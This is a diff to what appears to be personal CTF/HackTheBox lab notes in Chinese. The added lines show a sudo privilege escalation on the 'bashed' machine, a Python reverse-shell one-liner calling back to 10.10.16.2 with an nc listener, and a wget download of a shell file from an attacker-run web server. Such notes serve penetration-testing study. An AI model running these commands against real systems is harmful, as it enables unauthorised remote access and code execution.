@@ -128,8 +128,36 @@ User shelly may run the following commands on Shocker:
 root
 ```
 
+```
+$ sudo -l 
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+$ sudo -u scriptmanager /bin/bash
+bash: cannot set terminal process group (822): Inappropriate ioctl for device
+bash: no job control in this shell
+scriptmanager@bashed:/$ 
+```
 
+### 反弹shell
 
+```
+本地：
+sudo nc -nvlp 1111
+受害服务器：
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+### 远程文件包含获取shell
+
+```
+本地：
+sudo python3 -m http.server 80 //shell文件放在开启该命令的文件夹下，如根目录
+受害服务器：
+wget 10.10.16.2/new.py
+```
 
 
